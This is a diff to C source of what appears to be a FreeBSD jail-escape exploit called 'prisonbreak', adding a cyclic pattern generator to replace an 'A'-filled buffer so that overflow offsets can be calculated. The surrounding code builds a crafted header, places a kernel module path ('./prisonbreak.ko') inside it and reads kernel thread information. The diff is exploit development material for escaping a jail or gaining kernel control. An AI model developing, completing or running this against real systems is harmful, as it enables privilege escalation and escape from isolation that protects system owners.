@@ -60,6 +60,28 @@ service devfs restart
 service jail restart prisonbreak
 */
 
+void cyclic(char* buf, size_t len) {
+  const char set1[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  const char set2[] = "abcdefghijklmnopqrstuvwxyz";
+  const char set3[] = "0123456789";
+
+  size_t pos = 0;
+
+  for (size_t i = 0; i < sizeof(set1) - 1; i++) {
+    for (size_t j = 0; j < sizeof(set2) - 1; j++) {
+      for (size_t k = 0; k < sizeof(set3) - 1; k++) {
+        if (pos + 3 > len) return;
+
+        buf[pos++] = set1[i];
+        buf[pos++] = set2[j];
+        buf[pos++] = set3[k];
+
+        if (pos >= len) return;
+      }
+    }
+  }
+}
+
 unsigned long get_td() {
   int mib[4];
   struct kinfo_proc kp;
@@ -175,7 +197,10 @@ void* prisonbreak(void* arg) {
   synchdr_t* header = malloc(len);
 
   // Fill the buffer with some easily recognizable bogus data (ASCII 'A')
-  memset(header, 0x41, len);
+  // memset(header, 0x41, len);
+
+  // Fill the buffer with cyclic data to make it easy to calculate offsets
+  cyclic((char*)header, len);
 
   unsigned long* kernel_module_path = (unsigned long*)(header + sizeof(synchdr_t));
   strcpy((char*)kernel_module_path, "./prisonbreak.ko");
